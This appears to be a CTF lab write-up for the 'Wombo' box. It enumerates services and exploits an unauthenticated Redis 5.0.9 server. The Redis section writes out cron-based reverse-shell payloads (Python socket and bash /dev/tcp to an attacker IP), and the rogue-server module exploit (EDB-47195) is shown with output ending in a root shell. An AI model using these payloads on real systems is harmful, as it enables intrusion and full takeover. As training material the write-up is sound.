# Wombo
## Table of Contents
* [Summary](#summary)
* [Enumerate](#enumerate)
  * [Ports](#ports)
  * [Services](#services)
    * [SSH](#ssh) 
    * [HTTP](#http)
    * [Redis](#redis)
    * [MongoDB](#mongodb)
  * [OS](#os)
    * [Nmap OS Discovery Scan](#nmap-os-discovery-scan)
* [Exploit](#exploit)
  * [Password Guessing](#password-guessing) 
    * [Hydra](#hydra)
  * [EDB-ID-47195](#edb-id-47195) 
    * [n0b0dycn POC](#n0b0dycn-poc)
* [Explore](#explore)
* [Escalate](#escalate)
* [Lessons Learned](#lessons-learned)

## Summary
* Hostname: wombo
* Description: Wombo is full of the freshest hipster tech around. 
* IP Address: 192.168.94.69
* MAC Address: (ref:)
* Domain: WORKGROUP
* TCP Ports and Services
  * 22
    * OpenSSH 7.4
  * 80
    * nginx 1.10.3 - Web Server
  * 6379
    * Redis 5.0.9 - Remote Dictionary Server (database for key-value pairs)
  * 8080
    * NodeBB - Forum Server
  * 27017
    * MongoDB 4.0.18 - Database Management System
* OS 
  * Distro: Debian (ref: Nmap)
  * Kernel: Linux 4.9.0-12 (ref: redis-cli)
  * Architecture: x64 (ref: redis-cli)
* Users (ref: post-exploitation)
  * root
* Vulnerabilities and Exploits
  * EDB-ID-47195 (ref: searchsploit)
    * n0b0dycn POC
* Flag
  * 2434fee2e5f03eb879441459da722770
* Hints
  * Scan all TCP ports. Be sure to enumerate service versions.
  * When remote access is enabled on this service, there is an easy RCE exploit for it.
  * If you are struggling with getting a shell back, check your LPORT. 

# Enumerate
## Setup
```bash
TARGET=192.168.141.69
NAME=wombo
new-ctf $NAME
cd $NAME
```

## Ports
```bash
sudo nmap $TARGET -sS -sU --min-rate 1000 -oN scans/$NAME-nmap-initial
sudo nmap $TARGET -sS -sU -p- --min-rate 1000 -oN scans/$NAME-nmap-complete
sudo nmap $TARGET -sV $(print-open-ports-from-nmap-scan scans/$NAME-nmap-complete) -oN scans/$NAME-nmap-versions

# output
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-01 08:30 EDT
Nmap scan report for 192.168.94.69
Host is up (0.15s latency).

PORT      STATE  SERVICE    VERSION
22/tcp    open   ssh        OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
53/tcp    closed domain
80/tcp    open   http       nginx 1.10.3
6379/tcp  open   redis      Redis key-value store 5.0.9
8080/tcp  open   http-proxy
27017/tcp open   mongod?
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
...snipped...
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 59.05 seconds
```
```bash
sudo nmap 192.168.132.69 -A -oN scans/wombo-nmap-aggresive

# output
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-01 20:25 EDT
Nmap scan report for 192.168.132.69
Host is up (0.077s latency).

PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
| ssh-hostkey: 
|   2048 09:80:39:ef:3f:61:a8:d9:e6:fb:04:94:23:c9:ef:a8 (RSA)
|   256 83:f8:6f:50:7a:62:05:aa:15:44:10:f5:4a:c2:f5:a6 (ECDSA)
|_  256 1e:2b:13:30:5c:f1:31:15:b4:e8:f3:d2:c4:e8:05:b5 (ED25519)
80/tcp    open  http       nginx 1.10.3
|_http-server-header: nginx/1.10.3
|_http-title: Welcome to nginx!
6379/tcp  open  redis      Redis key-value store 5.0.9
8080/tcp  open  http-proxy
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 Not Found
|     X-DNS-Prefetch-Control: off
|     X-Frame-Options: SAMEORIGIN
|     X-Download-Options: noopen
|     X-Content-Type-Options: nosniff
|     X-XSS-Protection: 1; mode=block
|     Referrer-Policy: strict-origin-when-cross-origin
|     X-Powered-By: NodeBB
|     set-cookie: _csrf=GBWvU9kbJDa3ccsxrxabxjaQ; Path=/
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 11098
|     ETag: W/"2b5a-IuK5LKwukJtzaqg8jG8e3Y343yY"
|     Vary: Accept-Encoding
|     Date: Fri, 02 Jul 2021 00:25:46 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en-GB" data-dir="ltr" style="direction: ltr;" >
|     <head>
|     <title>Not Found | NodeBB</title>
|     <meta name="viewport" content="width&#x3D;device-width, initial-scale&#x3D;1.0" />
|     <meta name="content-type" content="text/html; charset=UTF-8" />
|     <meta name="apple-mobile-web-app-capable" content="yes" />
|     <meta name="mobile-web-app-capable" content="yes" />
|     <meta property="og:site_n
|   GetRequest: 
|     HTTP/1.1 200 OK
|     X-DNS-Prefetch-Control: off
|     X-Frame-Options: SAMEORIGIN
|     X-Download-Options: noopen
|     X-Content-Type-Options: nosniff
|     X-XSS-Protection: 1; mode=block
|     Referrer-Policy: strict-origin-when-cross-origin
|     X-Powered-By: NodeBB
|     set-cookie: _csrf=RsoY7Vy2IMSQH72nY0eTpr-3; Path=/
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 18181
|     ETag: W/"4705-peFhQX9X3hk7CBURtCymmcdiI9k"
|     Vary: Accept-Encoding
|     Date: Fri, 02 Jul 2021 00:25:45 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en-GB" data-dir="ltr" style="direction: ltr;" >
|     <head>
|     <title>Home | NodeBB</title>
|     <meta name="viewport" content="width&#x3D;device-width, initial-scale&#x3D;1.0" />
|     <meta name="content-type" content="text/html; charset=UTF-8" />
|     <meta name="apple-mobile-web-app-capable" content="yes" />
|     <meta name="mobile-web-app-capable" content="yes" />
|     <meta property="og:site_name" content
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     X-DNS-Prefetch-Control: off
|     X-Frame-Options: SAMEORIGIN
|     X-Download-Options: noopen
|     X-Content-Type-Options: nosniff
|     X-XSS-Protection: 1; mode=block
|     Referrer-Policy: strict-origin-when-cross-origin
|     X-Powered-By: NodeBB
|     Allow: GET,HEAD
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 8
|     ETag: W/"8-ZRAf8oNBS3Bjb/SU2GYZCmbtmXg"
|     Vary: Accept-Encoding
|     Date: Fri, 02 Jul 2021 00:25:45 GMT
|     Connection: close
|     GET,HEAD
|   RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|_    Connection: close
| http-robots.txt: 3 disallowed entries 
|_/admin/ /reset/ /compose
|_http-title: Home | NodeBB
27017/tcp open  mongodb    MongoDB 4.0.18
| fingerprint-strings: 
|   FourOhFourRequest, GetRequest: 
|     HTTP/1.0 200 OK
|     Connection: close
|     Content-Type: text/plain
|     Content-Length: 85
|     looks like you are trying to access MongoDB over HTTP on the native driver port.
|   mongodb: 
|     errmsg
|     command serverStatus requires authentication
|     code
|     codeName
|_    Unauthorized
| mongodb-databases: 
|   errmsg = command listDatabases requires authentication
|   ok = 0.0
|   code = 13
|_  codeName = Unauthorized
| mongodb-info: 
|   MongoDB Build info
|     modules
|     versionArray
|       2 = 18
|       1 = 0
|       0 = 4
|       3 = 0
|     allocator = tcmalloc
|     version = 4.0.18
|     buildEnvironment
|       ccflags = -fno-omit-frame-pointer -fno-strict-aliasing -ggdb -pthread -Wall -Wsign-compare -Wno-unknown-pragmas -Winvalid-pch -Werror -O2 -Wno-unused-local-typedefs -Wno-unused-function -Wno-deprecated-declarations -Wno-unused-but-set-variable -Wno-missing-braces -fstack-protector-strong -fno-builtin-memcmp
|       cxx = /opt/mongodbtoolchain/v2/bin/g++: g++ (GCC) 5.4.0
|       distarch = x86_64
|       linkflags = -pthread -Wl,-z,now -rdynamic -Wl,--fatal-warnings -fstack-protector-strong -fuse-ld=gold -Wl,--build-id -Wl,--hash-style=gnu -Wl,-z,noexecstack -Wl,--warn-execstack -Wl,-z,relro
|       cc = /opt/mongodbtoolchain/v2/bin/gcc: gcc (GCC) 5.4.0
|       target_arch = x86_64
|       distmod = debian92
|       target_os = linux
|       cxxflags = -Woverloaded-virtual -Wno-maybe-uninitialized -std=c++14
|     openssl
|       compiled = OpenSSL 1.1.0l  10 Sep 2019
|       running = OpenSSL 1.1.0l  10 Sep 2019
|     maxBsonObjectSize = 16777216
|     bits = 64
|     sysInfo = deprecated
|     storageEngines
|       2 = mmapv1
|       1 = ephemeralForTest
|       0 = devnull
|       3 = wiredTiger
|     debug = false
|     ok = 1.0
|     javascriptEngine = mozjs
|     gitVersion = 6883bdfb8b8cff32176b1fd176df04da9165fd67
|   Server status
|     errmsg = command serverStatus requires authentication
|     ok = 0.0
|     code = 13
|_    codeName = Unauthorized
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
...snipped...
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Linux 3.X|4.X (91%)
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
Aggressive OS guesses: Linux 3.11 - 4.1 (91%), Linux 4.4 (91%), Linux 3.2.0 (90%), Linux 3.13 (88%), Linux 3.16 (88%), Linux 3.10 - 3.16 (86%), Linux 3.10 - 3.12 (85%), Linux 3.10 - 4.11 (85%), Linux 3.12 (85%), Linux 3.13 or 4.2 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   77.33 ms 192.168.49.1
2   77.35 ms 192.168.132.69

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 66.17 seconds
```

## Services
### HTTP
```bash
dirb http://$TARGET:80 -r -z10 -o scans/$NAME-dirb-common-80

# output
END_TIME: Thu Jul  1 20:17:15 2021
DOWNLOADED: 4612 - FOUND: 0
```
```bash
dirb http://$TARGET:8080 -r -z10 -o scans/$NAME-dirb-common-8080

# output
---- Scanning URL: http://192.168.132.69:8080/ ----
+ http://192.168.132.69:8080/admin (CODE:302|SIZE:36)                                                                                 
+ http://192.168.132.69:8080/Admin (CODE:302|SIZE:36)                                                                                 
+ http://192.168.132.69:8080/ADMIN (CODE:302|SIZE:36)                                                                                 
+ http://192.168.132.69:8080/api (CODE:200|SIZE:3255)                                                                                 
+ http://192.168.132.69:8080/assets (CODE:301|SIZE:179)                                                                               
+ http://192.168.132.69:8080/categories (CODE:200|SIZE:18970)                                                                         
+ http://192.168.132.69:8080/chats (CODE:302|SIZE:28)                                                                                 
                                                                                                                                      
(!) FATAL: Too many errors connecting to host
    (Possible cause: OPERATION TIMEOUT)
```
```bash
nikto -h 192.168.132.69 -p 80 -T 2 -Format txt -o scans/wombo-nikto-misconfig-80

# output
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.132.69
+ Target Hostname:    192.168.132.69
+ Target Port:        80
+ Start Time:         2021-07-01 23:12:19 (GMT-4)
---------------------------------------------------------------------------
+ Server: nginx/1.10.3
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ 1350 requests: 0 error(s) and 3 item(s) reported on remote host
+ End Time:           2021-07-01 23:14:10 (GMT-4) (111 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```
```bash
nikto -h 192.168.132.69 -p 8080 -T 2 -Format txt -o scans/wombo-nikto-misconfig-8080

# output
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.132.69
+ Target Hostname:    192.168.132.69
+ Target Port:        8080
+ Start Time:         2021-07-01 23:15:38 (GMT-4)
---------------------------------------------------------------------------
+ Server: No banner retrieved
+ Retrieved x-powered-by header: NodeBB
+ Uncommon header 'x-dns-prefetch-control' found, with contents: off
+ Cookie _csrf created without the httponly flag
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Entry '/admin/' in robots.txt returned a non-forbidden or redirect HTTP code (302)
+ Entry '/compose/' in robots.txt returned a non-forbidden or redirect HTTP code ()
+ "robots.txt" contains 3 entries which should be manually viewed.
+ Allowed HTTP Methods: GET, HEAD 
+ 1356 requests: 1 error(s) and 7 item(s) reported on remote host
+ End Time:           2021-07-01 23:18:46 (GMT-4) (188 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

### Redis
```bash
echo -e "\n\n*/1 * * * * /usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.49.141\",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n\n"|redis-cli -h 192.168.141.69 -x set 1
redis-cli -h 192.168.141.69 config set dir /var/spool/cron/crontabs/
redis-cli -h 192.168.141.69 config set dbfilename root
redis-cli -h 192.168.141.69 save
```
```bash
redis-cli -h 192.168.141.69 flushall 
echo -e "\n\n*/1 * * * * /bin/bash -i >& /dev/tcp/192.168.49.141/443 0>&1\n\n" | redis-cli -h 192.168.141.69 -x set 1
redis-cli -h 192.168.141.69 config set dir /var/spool/cron/ 
redis-cli -h 192.168.141.69 config set dbfilename root 
redis-cli -h 192.168.141.69 save
```
```bash
redis-cli -h 192.168.141.69 flushall 
echo -e "\n\n*/1 * * * * ping -c2 192.168.49.141 \n\n" | redis-cli -h 192.168.141.69 -x set 1
redis-cli -h 192.168.141.69 config set dir /var/spool/cron/ 
redis-cli -h 192.168.141.69 config set dbfilename root 
redis-cli -h 192.168.141.69 save
```

### MongoDB
```bash
sudo nmap 192.168.132.69 -p27017 --script mongodb-brute -oN scans/wombo-nmap-scripts-mongodb-brute

# output
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-01 20:41 EDT
Nmap scan report for 192.168.132.69
Host is up (0.086s latency).

PORT      STATE SERVICE
27017/tcp open  mongod
| mongodb-brute: 
|   Accounts: No valid accounts found
|_  Statistics: Performed 15177 guesses in 600 seconds, average tps: 24.9

Nmap done: 1 IP address (1 host up) scanned in 601.04 seconds
```

## OS
### Nmap OS Discovery Scan
```bash
sudo nmap $TARGET -O -oN scans/$NAME-nmap-os

# output
NSTR
```

# Exploit
## Password Guessing
### Hydra
This did not work.
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt $TARGET http-post-form "/login?local=1:username=^USER^&password=^PASS^:Login Unsuccessful"

# output
NSTR
```

## EDB-ID-47195
This module can be used to leverage the extension functionality added by Redis 4.x and 5.x to execute arbitrary code. To transmit the given extension it makes use of the feature of Redis which called replication between master and slave.

### n0b0dycn POC
This worked!
```bash
mkdir n0b0dycn
cd n0b0dycn
git clone https://github.com/n0b0dyCN/redis-rogue-server.git
cd redis-rogue-server/RedisModulesSDK/ 
make
mv exp.so ../../exploit.so
cd ../../
sudo python3 --lhost 192.168.141.69 --rhost 192.168.49.141 --exp exploit.so -v

# output
| ___ \       | (_)     | ___ \                       /  ___|                         
| |_/ /___  __| |_ ___  | |_/ /___   __ _ _   _  ___  \ `--.  ___ _ ____   _____ _ __ 
|    // _ \/ _` | / __| |    // _ \ / _` | | | |/ _ \  `--. \/ _ \ '__\ \ / / _ \ '__|
| |\ \  __/ (_| | \__ \ | |\ \ (_) | (_| | |_| |  __/ /\__/ /  __/ |   \ V /  __/ |   
\_| \_\___|\__,_|_|___/ \_| \_\___/ \__, |\__,_|\___| \____/ \___|_|    \_/ \___|_|   
                                     __/ |                                            
                                    |___/                                             
@copyright n0b0dy @ r3kapig

[info] TARGET 192.168.141.69:6379
[info] SERVER 192.168.49.141:8080
[info] Setting master...
[<-] b'*3\r\n$7\r\nSLAVEOF\r\n$14\r\n192.168.49.141\r\n$4\r\n8080\r\n'
[->] b'+OK\r\n'
[info] Setting dbfilename...
[<-] b'*4\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$10\r\ndbfilename\r\n$6\r\nexp.so\r\n'
[->] b'+OK\r\n'
[->] b'*1\r\n$4\r\nPING\r\n'
[<-] b'+PONG\r\n'
[->] b'*3\r\n$8\r\nREPLCONF\r\n$14\r\nlistening-port\r\n$4\r\n6379\r\n'
[<-] b'+OK\r\n'
[->] b'*5\r\n$8\r\nREPLCONF\r\n$4\r\ncapa\r\n$3\r\neof\r\n$4\r\ncapa\r\n$6\r\npsync2\r\n'
[<-] b'+OK\r\n'
[->] b'*3\r\n$5\r\nPSYNC\r\n$40\r\n53c88bb260c5a95b8f9ecc4701a957edb7236d44\r\n$1\r\n1\r\n'
[<-] b'+FULLRESYNC ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ 1\r\n$47888\r\n\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00'......b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x11\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x008\xb4\x00\x00\x00\x00\x00\x00\xd3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\r\n'
[info] Loading module...
[<-] b'*3\r\n$6\r\nMODULE\r\n$4\r\nLOAD\r\n$8\r\n./exp.so\r\n'
[->] b'+OK\r\n'
[info] Temerory cleaning up...
[<-] b'*3\r\n$7\r\nSLAVEOF\r\n$2\r\nNO\r\n$3\r\nONE\r\n'
[->] b'+OK\r\n'
[<-] b'*4\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$10\r\ndbfilename\r\n$8\r\ndump.rdb\r\n'
[->] b'+OK\r\n'
[<-] b'*2\r\n$11\r\nsystem.exec\r\n$11\r\nrm ./exp.so\r\n'
[->] b'$1\r\ne\r\n'
What do u want, [i]nteractive shell or [r]everse shell: i
[info] Interact mode start, enter "exit" to quit.
[<<] whoami
[<-] b'*2\r\n$11\r\nsystem.exec\r\n$6\r\nwhoami\r\n'
[->] b'$6\r\n\x08root\n\r\n'
[>>]root
[<<] cat /root/root.txt
[<-] b'*2\r\n$11\r\nsystem.exec\r\n$18\r\ncat /root/root.txt\r\n'
[->] b'$0\r\n\r\n'
[<<] cat /root/proof.txt
[<-] b'*2\r\n$11\r\nsystem.exec\r\n$19\r\ncat /root/proof.txt\r\n'
[->] b'$33\r\n2434fee2e5f03eb879441459da722770\n\r\n'
[>>] 2434fee2e5f03eb879441459da722770
[<<] exit
```

# Explore
NSTR

# Escalate
NSTR

# Lessons Learned
* A wombo, or word combination, is a combination on two or more words creating one succinct word that combines the meaning of its lesser parts (https://www.urbandictionary.com/define.php?term=wombo).
